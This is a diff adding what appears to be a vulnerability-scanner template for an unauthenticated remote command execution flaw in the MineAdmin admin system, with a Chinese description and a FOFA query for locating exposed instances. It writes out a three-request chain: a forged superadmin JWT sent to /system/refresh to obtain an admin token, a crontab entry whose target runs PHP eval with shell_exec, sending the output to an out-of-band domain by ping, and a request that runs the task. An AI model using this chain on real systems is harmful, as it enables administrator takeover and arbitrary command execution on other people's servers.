@@ -1,0 +1,55 @@
+## id: VEID-2026-11103
+## name: MineAdmin企业级后台管理系统命令执行漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2026
+## description: 1、system/refresh处存在逻辑缺陷漏洞，”refresh”方法用于刷新 Token，攻击者可以未授权构造一个签名为超级管理员的 JWT，直接骗过系统，获取一个合法的、拥有管理员权限的新 Token。2、setting/crontab/save定时任务处存在命令执行漏洞
+## affects: MineAdmin v1.x MineAdmin v2.x
+## fofa-query: body="MineAdmin"
+## verification: true
+
+
+
+POST /system/refresh HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
+Content-Type: application/json;charset=UTF-8
+
+
+#@ condition: and
+#> extract: name=token, from=body, regex=/"token"\s*:\s*"([^"\\]*(?:\\.[^"\\]*)*)"/, group=1
+#@ matcher: status_code == 200
+
+---
+
+POST /setting/crontab/save HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Authorization: Bearer {{token}}
+Content-Type: application/json;charset=UTF-8
+
+{"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval('$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".{{oob_domain}}\");');"}
+
+#@ condition: and
+#> extract: name=id, from=body, regex=/"id"\s*:\s*(\d+)/, group=1
+#@ matcher: status_code == 200
+
+
+---
+
+POST /setting/crontab/run HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Authorization: Bearer {{token}}
+Content-Type: application/json;charset=UTF-8
+
+{"id":{{id}}}
+
+
+#@ condition: and
+#@ matcher: body contains '"success"' && body contains '"code":'
+
+
+
+# @VEIL-STAMP: 1c3318e83cb408aaae6becb0f24dd6e0b3779c1dbd16c1e9ee6aab2dd8029dc0
